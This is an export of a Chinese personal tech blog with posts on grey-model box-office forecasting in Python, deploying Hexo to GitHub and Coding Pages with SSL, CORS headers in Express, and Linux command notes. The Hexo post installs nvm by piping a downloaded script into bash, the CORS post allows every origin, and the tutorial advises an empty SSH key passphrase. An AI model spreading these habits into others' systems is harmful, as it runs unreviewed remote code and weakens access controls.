(X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i+n)) # print f # 预测接下来 m 天各天票房 return sum(history_data) + sum(f) # 预测总票房 else: print(&apos;灰色预测法不适用&apos;) # 工作日数据： 7月27~8月4日除去周末 history_work_data = [9831.6,21226.6,27224.7,29118.1,27736.3,22375.8,26340.9] m1 = 5 ## 周末 history_weekend_data = [30988.6,36457.4,33049.7] # 周末数据,7月29,7月30,8月5号 m2 = 1 forcast_box = predict_func(history_work_data, m1) + predict_func(history_weekend_data, m2) print(&quot;The forcast total box office of Wolf Warriors II is %d million after %d days&quot;%(forcast_box,m1+m2)) 验证源码新建 gm_validation.py 复制一下内容，保存，执行： &gt;# python gm_validation.py 即可看到输出结果 # -*- coding: utf-8 -*- import numpy as np import math history_data = [9831.6,21226.6,27224.7,29118.1,27736.3,22375.8] # 8月4号： 26340.9 n = len(history_data) X0 = np.array(history_data) #累加生成 history_data_agg = [sum(history_data[0:i+1]) for i in range(n)] X1 = np.array(history_data_agg) #计算数据矩阵B和数据向量Y B = np.zeros([n-1,2]) Y = np.zeros([n-1,1]) for i in range(0,n-1): B[i][0] = -0.5*(X1[i] + X1[i+1]) B[i][1] = 1 Y[i][0] = X0[i+1] #计算GM(1,1)微分方程的参数a和u #A = np.zeros([2,1]) A = np.linalg.inv(B.T.dot(B)).dot(B.T).dot(Y) a = A[0][0] u = A[1][0] #建立灰色预测模型 XX0 = np.zeros(n) XX0[0] = X0[0] for i in range(1,n): XX0[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i)); #模型精度的后验差检验 e = 0 #求残差平均值 for i in range(0,n): e += (X0[i] - XX0[i]) e /= n #求历史数据平均值 aver = 0; for i in range(0,n): aver += X0[i] aver /= n #求历史数据方差 s12 = 0; for i in range(0,n): s12 += (X0[i]-aver)**2; s12 /= n #求残差方差 s22 = 0; for i in range(0,n): s22 += ((X0[i] - XX0[i]) - e)**2; s22 /= n #求后验差比值 C = s22 / s12 #求小误差概率 cout = 0.0 for i in range(0,n): if abs((X0[i] - XX0[i]) - e) &lt; 0.6754*math.sqrt(s12): cout = cout+1 else: cout = cout P = (cout / n) sum_pre = 0 if (C &lt; 0.35 and P &gt; 0.95): m = 1 # 预测8月3号，8月4号 #预测精度为一级 f = np.zeros(m) for i in range(0,m): f[i] = (X0[0] - u/a)*(1-math.exp(a))*math.exp(-a*(i+n)) print f # 预测接下来 m 天各天票房 else: print(&apos;灰色预测法不适用&apos;) 刚学的 Python，希望您宽广的胸怀能包它的存在，如果您有建议或意见可以通过邮件 syncher@qq.com 与我取得联系。 申明： 预测结果仅代表个人观点，历史数据来自百度糯米电影]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>战狼</tag>
        <tag>GM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo 双线部署启用 SSL 【不完全指北】]]></title>
    <url>%2Fexperience%2Fguide%2Flinux-blog-deployed-in-github-and-coding%2F</url>
    <content type="text"><![CDATA[最近将博客从 Wordpress 迁移到了 Hexo，因此写了一个从 Hexo 的部署到将代码发布到 GitHub Pages 和 Coding Pages 最后启用 SSL 的双线部署教程。如果您也在折腾双线 部署，您不妨可以看看这篇文章，大概流程如下： 搭建 Hexo 写作环境 部署到 GitHub 部署到 Coding Pages 注册域名并设置 DNS 解析 启用 SSL 选择 Hexo 双线部署原因 Hexo 是一个开源的博客写作框架，部署简单，当前背景下 Markdown 写作不二之选。 选择代码托管服务一方面是为了省去国内 VPS 空间需要域名备案的麻烦，另一方面是省钱。 选择选线部署是因为 GitHub Pages 自定义的域名不支持 SSL 服务。 此外 GitHub 在国内访问速度慢到不能接受。 综上述，选择 GitHub Pages + Coding Pages 双线部署，国内路线走 Coding Pages 并启用 SSL，国外路线走 GitHub，并起到备份作用。 Hexo 部署Node 安装 Linux (NVM 方式安装) # curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash 或者 # wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash 脚本执行完毕后 # nvm # Node Version Manager Note: &lt;version&gt; refers to any version-like string nvm understands. This includes: - full or partial version numbers, starting with an optional &quot;v&quot; (0.10, v0.1.2, v1) - default (built-in) aliases: node, stable, unstable, iojs, system - custom aliases you define with `nvm alias foo`... 输出使用教程，如果失败请查阅官网：https://github.com/creationix/nvm # nvm install v7 // 安装 node 7 建议不要安装最新版，最新版 Hexo 会报错 # node -v v7.10.1 输出版本号 Node 安装成功。 Windows 用户 Node 官网中下载稳定版本，不建议下载最新版，最新版 Hexo 报错。下载完成后直接安装，安装时选择 Add to PATH。安装完毕后win + r输入 cmd： node -v 输出版本号安装成功。如安装失败可以参考http://www.runoob.com/nodejs/nodejs-install-setup.html 『注』如果没有添加到环境变量，可以按照如下步骤手动添加。假设安装到 D:\Dev\nodejs。win+r输入sysdm.cpl，选择『高级』–&gt; 『环境变量』–&gt; 『系统变量』找到path点击『编辑』，在末尾添加 Node 的安装路径D:\Dev\nodejs和C:\Users\you_computer_name\AppData\Roaming\npm Git 安装 Linux 安装 Git Windows 安装 Git 确保 Node 和 Git 安装成功后进入下一步。 Hexo 部署Hexo 的部署很简单，只需 3 步： 安装 hexo npm install -g hexo-cli 安装依赖 # mkdir -p /home/www/hexo # cd /home/www/hexo` # hexo init # 初始化 # npm install # 安装依赖 部署完成 # hexo g # 静态文件生成 # hexo s --debug # 服务运行，正常访问 http://localhost:4000/ 则部署完成 部署完成后当前目录下生成下列文件： . ├── _config.yml # 站点配置文件 ├── package.json # Node 依赖包 ├── scaffolds # 模版 文件夹 ├── source # 资源文件夹是存放用户资源的地方。 | ├── _drafts # 草稿 | └── _posts # 文章 └── themes # 主题 确保部署成功后进入下一步。 双线部署到 GitHub Pages 和 Coding Pages注册域名到各大域名供应商注册好你的域名，如果不知道去哪注册，你可以到这里看看。我选择的域名供应商是狗爹，成功注册到域名gbin.me，然后往下步。 生成 ssh-key配置好 ssh-key 在把代码提交到 GitHub 和 Coding 仓库时就不用输密码了，如果您已经配置过 ssh-key 了那么您可以跳过这一步。ssh 使用非对称加密，ssh-key 是一对密钥，私钥放在本地（放在 Hexo 部署的主机），公钥放在 GitHub 和 Coding 仓库。 # cd ~/.ssh 如果返回“… No such file or directory”，则： # ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot; 一直回车就行，这个过程中有个环节要求输密码，建议留空，回车就行，否则每次提交代码还得输密码，违反了初衷。 # ls ~/.ssh # id_rsa id_rsa.pub 确保 ssh-key 生成成功后。进入下一步。 GitHub 准备 新建 GitHub 仓库，取名为yourname.github.io，注意yourname一定与当前登录的账号名保持一致，如图: 在浏览器中输入 yourname.github.io 能访问说明 Pages 服务开启成功，默认访问到仓库的介绍内容。 开启 Pages 服务，点击 Settings找到GitHub Pages–&gt;Custom domain自定义域名填写自己注册好的域名。GitHub 中添加自定义域名后会在仓库中新建一个名为 CNAME 的文件，文件内部保存了自定义域名。 在浏览器中输入 yourname.github.io顺利跳转到自定义域名说明自定义域名成功，继续下一步。 【注意】 自定义域名后需要在 Hexo 的根目录下的 source 目录下新建一个 CNAME 文件，里面保存你的域名。否则提交的时候 Hexo 目录下没有 CNAME 所以 GitHub 仓库下的 CNMAE 文件会被认为是被删除，导致每次hexo d 部署的时候 GitHub 下的自定义域名失效。Coding Pages 没有这种情况。 配置 ssh-key 点击 GitHub 头像 –&gt; Settings: 点击左侧导航中的 SSH and GPG keys 选择 New SSH key，title随便填，把之前生成的公钥内容复制到 key下，即~/.ssh下的 id_rsa.pub 文件中的内容复制到 key中然后Add SSH key。 Coding 准备 新建 Coding Pages 仓库，取名和刚才建的 GitHub 仓库类似，yourname.coding.me,注意yourname一定与当前登录的账号名保持一致，如图: 点击导航中的 Pages 服务，部署来源选择master。在仓库中新建文件 index.html，写入hello word之类的测试内容。在浏览器中输入 yourname.coding.me 输出内容说明 Pages 服务开启成功。 自定义域名，点击导航中的 Pages 服务，自定义域名中绑定自己的域名。 ! 在浏览器中输入 yourname.coding.me顺利跳转到自定义域名说明自定义域名成功，继续下一步。 配置 ssh-key Coding 的 ssh-key 配置和 GitHub 相似。 点击 Coding 头像 –&gt; 个人设置， 点击左侧导航中的 SSH 公钥 添加即可。 站点配置回到 Hexo 站点目录，修改站点配置文件_config.yml。 【注意】配置文件有两个，一个叫主题配置文件在themes/_config.yml，另一个叫站点配置文件，在站点根目录下。 打开_config.yml找到deploy:修改为如下内容： deploy: type: git repo: github: git@github.com:syncher-bin/syncher-bin.github.io.git coding: git@git.coding.net:gbin/gbin.coding.me.git branch: master 其中 ``git@github.com:syncher-bin/syncher-bin.github.io.git和git@git.coding.net:gbin/gbin.coding.me.git 分别为 GitHub 和 Coding 的仓库地址，因为配置好了 ssh-key ，所以请选择 SSH 仓库地址。 【注意】 deploy 的值之 Hexo 版本是这样写的： deploy: type: git repo: github: git@github.com:syncher-bin/syncher-bin.github.io.git, master coding: git@git.coding.net:gbin/gbin.coding.me.git, master 但这样写会报错： FATAL fatal: remote part of refspec is not a valid name in HEAD: master 发布以上配置好后切换到 Hexo 站点目录，执行： # hexo g # hexo s --debug 确保本地正常后发布： # hexo d 开启双线部署经历以上步骤是不是可以通过域名访问了呢，答案是否定的，因为域名还没有解析到正确的地址上。双线部署是国内请求 Coding Pages 国外请求 GitHub，因此要为域名设置解析路线，因为 Godaddy 不支持自定义解析路线，因此选择免费的 DNSPod 做 DNS 解析。 DNS 解析配置 注册并登陆到 DNSPod，在控制台中选择添加域名，之后会检测域名的解析状态，如果有解析记录选择导入。 用 DNSPod 提供的 DNS 服务器地址替换 Godaddy 的 DNS 服务器。 登陆 Godaddy，选择域名管理点击域名左上角的设置，选择管理DNS，在域名服务器中用 f1g1ns1.dnspod.net 和 f1g1ns2.dnspod.net 替换原来的服务器。 开启 Coding Pages 中的 HTTPS 切换到 DNSPod 中添加 3 条解析记录。 * CNAME 默认 xxx.coding.me 600 CNAME 默认 xxx.coding.me 600 @ A 默认 103.72.145.7 600 其中 103.72.145.7 是 ping xxx.coding.me 得到的 IP，CNAME 为域名的别名，指向 Coding 仓库。 【注意】申请证书时，解析路线必须选择默认，否则 SSL/TSL 证书会申请失败，如https://coding.net/u/coding/p/Coding-Feedback/topic/354603 切换到 Coding 仓库中，点击 Pages 服务，选择强制 HTTPS 访问，点击申请。如果配置成功，10分钟之内即可申请下来。 开启双线部署的最后一步切换到 DNSPod ，更改解析记录。 添加 GitHub 解析记录，新增 4 条解析记录。 @ A 国外 192.30.252.153 - - 600 @ A 国外 192.30.252.154 - - 600 www CNAME 国外 syncher-bin.github.io - - 600 其中 192.30.252.153 和 192.30.252.154 有 GitHub 提供。CNAME 指向 syncher-bin.github.io 更改 Coding Page 解析记录。将线路类型改为国内即可。最终设置如下： 红色框与 GitHub 相关， 蓝色框与 Coding 相关。 测试使用 17ce 测试一下，你会发现国内访问响应服务器为 Coding 提过的 IP, 国外访问响应的服务器为 GitHub 提供的 IP，至此双线部署完毕。 致谢感谢开源社区的开发者和贡献者。 参考文章 https://linghucong.js.org/2016/04/15/2016-04-15-hexo-github-pages-blog/ http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Coding</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于 CORS 跨域的一点点理解]]></title>
    <url>%2Fexperience%2Fpractice%2Ffrontend-learn-about-cros%2F</url>
    <content type="text"><![CDATA[如果协议，端口（如果指定了一个）和域名对于两个页面是相同的，则两个页面具有相同的源，请求不同源的资源时涉及跨域请求。跨域请求有很多种，本文重点探讨 CORS 跨域请求。 同源策略请求不同源的资源时，浏览器的同源策略会对不同请求方式的资源做出限制，有一些标签可以可以嵌入第三方源： 12345678910111213141516171819- &lt;script src=&quot;...&quot;&gt;&lt;/script&gt;标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。- &lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type消息头。不同浏览器有不同的限制： IE, Firefox,Chrome, Safari(跳至CVE-2010-0051)部分 和 Opera。- &lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...- &lt;video&gt; 和 &lt;audio&gt;嵌入多媒体资源。- &lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;的插件。- @font-face引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。- &lt;frame&gt; 和 &lt;iframe&gt;载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 跨域XMLHttpRequest 和 Fetch 等都需遵从同源策略（同源策略是基于浏览器的，浏览器或阻止请求或阻止结果，CSRF 跨站就是阻止了结果，而有 Chrome 等浏览器阻止了 HTTP 到 HTTPS的请求），如果请求的资源不属于同一个源则为跨域请求。跨域请求需要客户端支持。 非简单请求 请求方式为 PUT、DELETE、CONNECT、OPTIONS、TRACE、PATCH 中的一种 人为设置了非安全头信息字段，这些字段除了一下字段都应该被人为是不安全的 Accept Accept-Language Content-Language Content-Type (but note the additional requirements below) DPR Downlink Save-Data Viewport-Width Width Content-Type 取值不属于下列之一 Content-Type 的值不属于下列之一: application/x-www-form-urlencoded multipart/form-data text/plain 对于非简单请求，浏览器先发送一个使用 OPTIONS 方法的“预检请求”，请求的同时在头信息中携带两个字段 Access-Control-Request-Headers:content-type // 告知服务器携带自定义非安全字段 Access-Control-Request-Method: POST // 告知服务器，实际请求将使用 POST 方法 “预检请求”的响应表明请求的源是否被允许跨域，请求自定的非安全字段是否被允许定义以及请求的方法是否被允许等。 Access-Control-Allow-Headers:Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild // 跨域请求可以定义这些非安全字段 Access-Control-Allow-Methods:PUT, POST, GET, DELETE, OPTIONS // 跨域请求可以使用这些方法 Access-Control-Allow-Origin:* // 跨域可以是任意源 Access-Control-Max-Age:86400 // 该时间内无需再次发起“预检请求” 首部字段 Access-Control-Max-Age 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该首部字段的值超过了最大有效时间，将不会生效。 简单请求请求方式是 GET/POST/HEAD 之一 且请求头信息中 Content-Type 取值为 application/x-www-form-urlencoded、multipart/form-data、text/plain中的一种。简单请求与非简单请求最大的区别是简单请求没有预请求。对于简单请求，如果服务器未返回正确的响应首部，则请求方不会收到任何数据。 GET /login HTTP/1.1 Host: 111.111.111.111:80 Content-Type: application/x-www-form-urlencoded Cache-Control: no-cache Postman-Token: 52804546-8b1b-7dad-0d96-ea14a4c41241 但 AJAX 发送跨域请求时，浏览器会在请求头信息中添加 origin 字段以表示请求的来源，服务端通过 Access-Control-Allow-Origin 字段设置允许跨域请求的地址。只有当 origin 的取值被包含在 Access-Control-Allow-Origin的值时跨域才被允许。 客户端请求头信息设置基于 Node 的 Express 头信息设置： app.all(&apos;*&apos;, function(req, res, next) { res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); // * 代表允许所有跨域 res.header(&quot;Access-Control-Allow-Headers&quot;, &quot;Content-Type, Content-Length, Authorization, Accept,X-Requested-With&quot;); res.header(&quot;Access-Control-Allow-Methods&quot;, &quot;PUT,POST,GET,DELETE,OPTIONS&quot;); // 允许跨域请求的方式 res.header(&quot;X-Powered-By&quot;, &apos; 3.2.1&apos;) res.header(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;); next(); }); [坑]Node 跨域头的设置 在发送跨域请求时如果是非简单请求将会先发送 OPTIONS “预检请求”，而 Node 服务在没有设置 OPTIONS 路由的情况下前端会有 503 的网关超时提示： XMLHttpRequest cannot load http://111.111.111.111:8089/login_service. Response to preflight request doesn&apos;t pass access control check: No &apos;Access-Control-Allow-Origin&apos; header is present on the requested resource. Origin &apos;http://111.111.111.111&apos; is therefore not allowed access. The response had HTTP status code 504. 因此为了避免才坑，后端需要对 OPTIONS 方式进行路由设置或提前返回结果，如下设置： app.all(&apos;*&apos;,function (req, res, next) { res.header(&apos;Access-Control-Allow-Origin&apos;, &apos;*&apos;); res.header(&apos;Access-Control-Allow-Headers&apos;, &apos;Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild&apos;); res.header(&apos;Access-Control-Allow-Methods&apos;, &apos;PUT, POST, GET, DELETE, OPTIONS&apos;); if (req.method == &apos;OPTIONS&apos;) { console.log(&apos;you can do that!!&apos;); res.send(200); //让options请求快速返回 } else { next(); } }); 参考链接： http://www.ruanyifeng.com/blog/2016/04/cors.html https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令使用笔记]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-command-note%2F</url>
    <content type="text"><![CDATA[本文记录工作学习中本人没有熟练掌握的 Linux 命令的基本使用方法，便于再次查阅。 tar 文件解压缩123456#压缩tar -czvf ***.tar.gztar -cjvf ***.tar.bz2#解压缩tar -xzvf ***.tar.gztar -xjvf ***.tar.bz2 参考:http://www.cnblogs.com/52linux/archive/2012/03/04/2379738.html scp 文件传输使用 上传文件 1scp username@servername:/path/filename /tmp/local_destination 下载文件 1scp /path/local_filename username@servername:/path 上传目录 1scp -r username@servername:remote_dir/ /tmp/local_dir 下载目录 1scp -r /tmp/local_dir username@servername:remote_dir 注意 上传走的是 ssh 通道，如果 ssh 端口不是 22 则需要用 -p 指定端口号，如： 1scp -r -p 2222 username@servername:/path/filename /tmp/local_path 传输目录时，不加 -r 参数会报错： 1scp: xxx: not a regular file 本地目录权限不足时，报错： 1scp: permission deined ​ xsel 复制内容到剪切板 安装 1sudo apt install xsel 使用 12345cat README.TXT | xselcat README.TXT | xsel -b # 如有问题可以试试-b选项xsel &lt; README.TXTxsel -c step 3: ctr + v 粘贴 查看 Linux 版本 show Linux version : cat /proc/versionor cat /etc/redhat-release ubuntu show version: https://www.jianshu.com/p/bda22f6db7a8 lsb_release -a 查看内存1free -m used=total-free 即total=used+free 实际内存占用：used-buffers-cached 即 total-free-buffers-cached 实际可用内存：buffers+cached+free Windwos 也有常用命令 Windows 重启网卡 123禁用网卡: netsh interface set interface &quot;本地连接&quot;disabled启用网卡: netsh interface set interface &quot;本地连接&quot; enabled ​ Windows CMD 下临时修改环境变量 12set path # show pathset path=%path%;C:\Python27\;C:\Python27\Scripts\ ​ MySQL 导入 .sql 文件 1mysql&gt; source xx.sql ​ Git 使用 ss 代理配置 12git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos; git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos; 查看 reflog 和回滚 1234$ git reflog 3f1ff1f HEAD@&#123;0&#125;: commit: archived &lt;reading-note...&gt; bb6ffae HEAD@&#123;1&#125;: clone: from https://github.com/brelian/brelian.github.io.git$ git reset HEAD@&#123;1&#125; git pull/push有多各分支时，如下使用 12git push origin [local branch]:[remote branch]git push origin master:hexo &quot; 将本地 master 分支提交到远程 hexo 分支 ​]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>命令</tag>
      </tags>
  </entry>
</search>
